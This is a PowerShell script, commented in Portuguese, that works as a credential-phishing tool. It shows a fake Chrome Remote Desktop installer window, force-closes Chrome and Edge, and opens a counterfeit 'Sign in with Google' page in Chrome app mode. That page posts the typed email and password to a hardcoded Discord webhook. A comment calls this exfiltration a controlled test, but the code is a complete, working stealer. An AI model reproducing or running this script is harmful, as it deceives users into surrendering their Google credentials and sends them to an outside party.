Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing
[System.Windows.Forms.Application]::EnableVisualStyles()

# Webhook Discord - inserido aqui para exfiltração dos dados (teste controlado)
$dc = 'https://discord.com/api/webhooks/1374561663470145626/i4nid5j-n2J5CBbCHm6tmEQrsGTgnJsFPVFY4r_nkNSbWBsMbhz9VpbKyS2_OfOUfdNV'

# Janela fake de instalação do Chrome Remote Desktop
$setupwindow = New-Object System.Windows.Forms.Form
$setupwindow.ClientSize = '600,450'
$setupwindow.Text = "Chrome Remote Desktop Setup"
$setupwindow.BackColor = "#ffffff"
$setupwindow.Opacity = 1
$setupwindow.TopMost = $true
$setupwindow.FormBorderStyle = 'FixedSingle'

$nextbutton = New-Object System.Windows.Forms.Button
$nextbutton.Text = "Next"
$nextbutton.Width = 85
$nextbutton.Height = 42
$nextbutton.Location = New-Object System.Drawing.Point(490, 395)
$nextbutton.Font = 'Microsoft Sans Serif,12'
$nextbutton.BackColor = "#287ae6"
$nextbutton.ForeColor = "#ffffff"

$textfield = New-Object System.Windows.Forms.Label
$textfield.Text = "Welcome to Google Remote Desktop Host"
$textfield.ForeColor = "#000000"
$textfield.AutoSize = $true
$textfield.Location = New-Object System.Drawing.Point(145, 140)
$textfield.Font = 'Microsoft Sans Serif,12'

$infofield = New-Object System.Windows.Forms.Label
$infofield.Text = "Remote access for your PC. Sign in with Google to continue..."
$infofield.ForeColor = "#000000"
$infofield.AutoSize = $true
$infofield.Location = New-Object System.Drawing.Point(120, 230)
$infofield.Font = 'Microsoft Sans Serif,10'

$infofield2 = New-Object System.Windows.Forms.Label
$infofield2.Text = "Chrome will close and restart during installation"
$infofield2.ForeColor = "#000000"
$infofield2.AutoSize = $true
$infofield2.Location = New-Object System.Drawing.Point(155, 260)
$infofield2.Font = 'Microsoft Sans Serif,10'

$linkfield = New-Object System.Windows.Forms.Label
$linkfield.Text = "Sign in to your account"
$linkfield.ForeColor = "#287ae6"
$linkfield.AutoSize = $true
$linkfield.Location = New-Object System.Drawing.Point(345, 407)
$linkfield.Font = 'Microsoft Sans Serif,10'

$setupwindow.controls.AddRange(@($nextbutton,$linkfield,$textfield,$infofield,$infofield2))

$nextbutton.Add_Click({
    $setupwindow.Close()
})

[void]$setupwindow.ShowDialog()

Start-Process -FilePath "taskkill" -ArgumentList "/F", "/IM", "chrome.exe" -NoNewWindow -Wait
Start-Process -FilePath "taskkill" -ArgumentList "/F", "/IM", "msedge.exe" -NoNewWindow -Wait
Sleep 1

# Página fake HTML de login
$htmlcode = @"
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Sign in with Google</title>
    <script>
        function sendEmail() {
            var webhookURL = '$dc';
            var message1 = document.getElementById("email").value;
            var message2 = document.getElementById("message").value;
            var message = "Email: " + message1 + " | Password: " + message2;
            var payload = {
                content: message
            };
            var xhr = new XMLHttpRequest();
            xhr.open("POST", webhookURL, true);
            xhr.setRequestHeader("Content-Type", "application/json");
            xhr.send(JSON.stringify(payload));
        }
    </script>
</head>
<body>
    <h2>Sign in to Google</h2>
    <p>Use your Google account</p>
    <form onsubmit="sendEmail(); event.preventDefault();">
        <label>Email:</label><br>
        <input type="email" id="email" required><br><br>
        <label>Password:</label><br>
        <input type="password" id="message" required><br><br>
        <input type="submit" value="Sign In">
    </form>
</body>
</html>
"@

# Salva a página em arquivo temporário
$htmlFile = "$env:TEMP\google_login.html"
$htmlcode | Out-File -FilePath $htmlFile -Force

# Abre no Chrome como se fosse app
$chromePath = "C:\Program Files\Google\Chrome\Application\chrome.exe"
$width = 530
$height = 600
$screen = [System.Windows.Forms.Screen]::PrimaryScreen
$left = ($screen.WorkingArea.Width - $width) / 2
$top = ($screen.WorkingArea.Height - $height) / 2
$arguments = "--new-window --window-position=$left,$top --window-size=$width,$height --app=`"$htmlFile`""

Start-Process -FilePath $chromePath -ArgumentList $arguments
